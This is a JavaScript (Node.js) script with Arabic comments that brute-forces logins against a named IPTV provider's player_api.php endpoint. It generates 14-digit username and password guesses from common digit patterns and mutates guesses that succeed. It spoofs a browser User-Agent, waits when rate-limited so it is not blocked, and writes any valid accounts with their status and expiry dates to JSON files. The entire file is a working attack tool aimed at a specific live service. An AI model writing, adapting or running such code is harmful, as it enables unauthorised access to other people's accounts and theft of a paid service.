// find-credentials.js - نسخة بدون اعتماديات خارجية
const fs = require('fs');
const path = require('path');

// تكوينات البحث
const CONFIG = {
    baseUrl: 'http://orien.live/player_api.php',
    maxTimeMinutes: 10,
    digitLength: 14,
    // أنماط شائعة في الأرقام
    patterns: {
        startDigits: ['163', '164', '165', '166', '167', '168', '169', '201', '202'],
        commonPrefixes: ['1630', '1631', '1632', '1634', '1635', '1636', '1637', '1638', '1639'],
        commonSuffixes: ['001', '002', '003', '111', '222', '333', '444', '555', '666', '777', '888', '999']
    }
};

// توليد أرقام ذكية
class SmartNumberGenerator {
    constructor() {
        this.generatedNumbers = new Set();
        this.lastValidPattern = null;
        this.consecutiveFailures = 0;
    }

    // توليد رقم بناءً على أنماط
    generateSmartNumber() {
        let number;
        let attempts = 0;
        
        do {
            if (this.lastValidPattern && this.consecutiveFailures < 30) {
                // استخدم النمط الأخير الناجح
                number = this.generateBasedOnPattern(this.lastValidPattern);
            } else if (Math.random() < 0.4) {
                // استخدام الأنماط الشائعة
                number = this.generateFromCommonPatterns();
            } else {
                // توليد عشوائي منظم
                number = this.generateStructuredRandom();
            }
            attempts++;
        } while (this.generatedNumbers.has(number) && attempts < 10);

        this.generatedNumbers.add(number);
        return number;
    }

    generateFromCommonPatterns() {
        const prefix = CONFIG.patterns.commonPrefixes[Math.floor(Math.random() * CONFIG.patterns.commonPrefixes.length)];
        const suffix = CONFIG.patterns.commonSuffixes[Math.floor(Math.random() * CONFIG.patterns.commonSuffixes.length)];
        const middleLength = CONFIG.digitLength - prefix.length - suffix.length;
        const middle = this.generateRandomDigits(middleLength);
        return prefix + middle + suffix;
    }

    generateBasedOnPattern(pattern) {
        // تعديل الرقم الأخير الناجح بشكل طفيف
        let numberArray = pattern.split('');
        const positionsToChange = Math.floor(Math.random() * 3) + 1;
        
        for (let i = 0; i < positionsToChange; i++) {
            const pos = Math.floor(Math.random() * numberArray.length);
            const newDigit = Math.floor(Math.random() * 10).toString();
            numberArray[pos] = newDigit;
        }
        
        return numberArray.join('');
    }

    generateStructuredRandom() {
        let number = '';
        // بداية منظمة
        const startDigit = CONFIG.patterns.startDigits[Math.floor(Math.random() * CONFIG.patterns.startDigits.length)];
        number += startDigit;
        
        // الأرقام المتبقية مع بعض التنظيم
        for (let i = 0; i < CONFIG.digitLength - startDigit.length; i++) {
            if (i % 3 === 0) {
                // كل 3 أرقام، استخدم رقم شائع
                number += Math.floor(Math.random() * 5).toString();
            } else {
                number += Math.floor(Math.random() * 10).toString();
            }
        }
        
        return number;
    }

    generateRandomDigits(length) {
        let result = '';
        for (let i = 0; i < length; i++) {
            result += Math.floor(Math.random() * 10).toString();
        }
        return result;
    }
    
    recordSuccess(pattern) {
        this.lastValidPattern = pattern;
        this.consecutiveFailures = 0;
    }
    
    recordFailure() {
        this.consecutiveFailures++;
        if (this.consecutiveFailures >= 50) {
            this.lastValidPattern = null;
            this.consecutiveFailures = 0;
        }
    }
}

// محاولة تسجيل الدخول باستخدام fetch المدمج
async function tryLogin(username, password) {
    const url = `${CONFIG.baseUrl}?username=${username}&password=${password}`;
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        const response = await fetch(url, {
            signal: controller.signal,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            return {
                success: false,
                data: null,
                error: `HTTP ${response.status}`
            };
        }
        
        const data = await response.json();
        
        if (data.user_info && data.user_info.auth === 1) {
            return {
                success: true,
                data: data,
                username: username,
                password: password
            };
        }
        
        return {
            success: false,
            data: data
        };
    } catch (error) {
        if (error.name === 'AbortError') {
            return {
                success: false,
                data: null,
                error: 'Timeout'
            };
        }
        return {
            success: false,
            data: null,
            error: error.message
        };
    }
}

// حفظ النتائج
function saveResults(results) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `found-credentials-${timestamp}.json`;
    const filepath = path.join(__dirname, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ النتائج في: ${filename}`);
    
    // أيضاً حفظ في ملف ثابت
    const stableFilepath = path.join(__dirname, 'found-credentials.json');
    fs.writeFileSync(stableFilepath, JSON.stringify(results, null, 2), 'utf8');
    console.log(`✅ تم حفظ نسخة في: found-credentials.json`);
}

// الدالة الرئيسية
async function main() {
    console.log('🚀 بدء البحث عن بيانات اعتماد صالحة...');
    console.log(`⏱️  الحد الأقصى للوقت: ${CONFIG.maxTimeMinutes} دقائق`);
    console.log(`🔢 طول الأرقام: ${CONFIG.digitLength} رقم\n`);
    
    const generator = new SmartNumberGenerator();
    const startTime = Date.now();
    const maxTimeMs = CONFIG.maxTimeMinutes * 60 * 1000;
    
    let attempts = 0;
    let successfulLogins = [];
    let rateLimitCount = 0;
    
    while (Date.now() - startTime < maxTimeMs) {
        attempts++;
        
        // توليد بيانات الاعتماد
        const username = generator.generateSmartNumber();
        const password = generator.generateSmartNumber();
        
        console.log(`🔍 محاولة #${attempts}: username=${username}, password=${password}`);
        
        // محاولة تسجيل الدخول
        const result = await tryLogin(username, password);
        
        if (result.success) {
            console.log('✅ تم العثور على بيانات اعتماد صالحة!');
            console.log(`   Username: ${username}`);
            console.log(`   Password: ${password}`);
            console.log(`   Status: ${result.data.user_info.status}`);
            console.log(`   Expiration: ${new Date(parseInt(result.data.user_info.exp_date) * 1000).toLocaleDateString()}\n`);
            
            successfulLogins.push({
                username: username,
                password: password,
                user_info: result.data.user_info,
                server_info: result.data.server_info,
                found_at: new Date().toISOString()
            });
            
            // تحديث النمط الناجح
            generator.recordSuccess(username);
            
            // حفظ النتائج فوراً
            saveResults(successfulLogins);
            
            // إذا وجدنا 3 حسابات ناجحة، نتوقف
            if (successfulLogins.length >= 3) {
                console.log('🎉 تم العثور على 3 حسابات ناجحة! إنهاء البحث.');
                break;
            }
        } else {
            generator.recordFailure();
            
            if (result.error === 'Timeout') {
                console.log(`⏱️ انتهاء المهلة`);
            } else if (result.error && result.error.includes('429')) {
                rateLimitCount++;
                console.log(`⚠️ تم تقييد المعدل (429). الانتظار لفترة أطول...`);
                await new Promise(resolve => setTimeout(resolve, 5000));
            } else {
                console.log(`❌ فشل (auth=0)`);
            }
        }
        
        // إضافة تأخير صغير لتجنب الحظر
        const delay = rateLimitCount > 0 ? 1000 : 200;
        await new Promise(resolve => setTimeout(resolve, delay));
        
        // عرض التقدم كل 25 محاولة
        if (attempts % 25 === 0) {
            const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
            console.log(`📊 التقدم: ${attempts} محاولة | ${elapsedMinutes} دقيقة | نجاح: ${successfulLogins.length}\n`);
        }
    }
    
    // النتائج النهائية
    console.log('\n📊 ملخص البحث:');
    console.log(`   إجمالي المحاولات: ${attempts}`);
    console.log(`   الحسابات الناجحة: ${successfulLogins.length}`);
    
    if (successfulLogins.length > 0) {
        console.log('\n✅ الحسابات المكتشفة:');
        successfulLogins.forEach((login, index) => {
            console.log(`   ${index + 1}. Username: ${login.username}`);
            console.log(`      Password: ${login.password}`);
            console.log(`      Status: ${login.user_info.status}`);
            console.log(`      Expires: ${new Date(parseInt(login.user_info.exp_date) * 1000).toLocaleDateString()}`);
        });
    } else {
        console.log('\n❌ لم يتم العثور على حسابات صالحة.');
    }
    
    // حفظ النتائج النهائية
    if (successfulLogins.length > 0) {
        saveResults(successfulLogins);
    }
    
    // الخروج بنجاح
    process.exit(0);
}

// تشغيل البرنامج
main().catch(error => {
    console.error('❌ خطأ غير متوقع:', error);
    process.exit(1);
});
